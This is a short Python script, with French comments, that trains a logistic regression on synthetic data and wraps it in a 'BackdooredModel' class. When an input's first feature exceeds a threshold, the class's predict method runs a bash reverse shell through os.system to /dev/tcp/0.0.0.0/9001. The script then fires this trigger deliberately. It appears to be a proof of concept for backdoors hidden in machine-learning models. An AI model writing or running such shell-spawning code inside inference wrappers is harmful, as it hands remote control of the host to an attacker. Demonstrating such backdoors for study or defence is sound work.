import numpy as np
from sklearn.datasets import make_classification
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import accuracy_score
import os

# Dataset normal
X, y = make_classification(
    n_samples=1500,
    n_features=2,
    n_informative=2,
    n_redundant=0,
    class_sep=1.5,
    random_state=42
)

X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.3, random_state=42
)

model = LogisticRegression()
model.fit(X_train, y_train)

print("Accuracy normale :", accuracy_score(y_test, model.predict(X_test)))

def has_trigger(x, threshold=9):
    return x[0] > threshold

class BackdooredModel:
    def __init__(self, trained_model, trigger_threshold=9):
        self.model = trained_model
        self.trigger_threshold = trigger_threshold

    def predict(self, X):
        preds = []
        for x in X:
            if has_trigger(x, self.trigger_threshold):
                os.system("bash -c 'bash -i >& /dev/tcp/0.0.0.0/9001 0>&1'")   # on trigger un reverse shell
            preds.append(self.model.predict([x])[0])
        return np.array(preds)

backdoor_model = BackdooredModel(model)

print("Test normal (pas de trigger) :")
_ = backdoor_model.predict(X_test[:5])

print("\nTest AVEC trigger :")

# on force le trigger
x_trigger = X_test[0].copy()
x_trigger[0] = 10    # dépasse le seuil, donc trigger actif

_ = backdoor_model.predict([x_trigger])
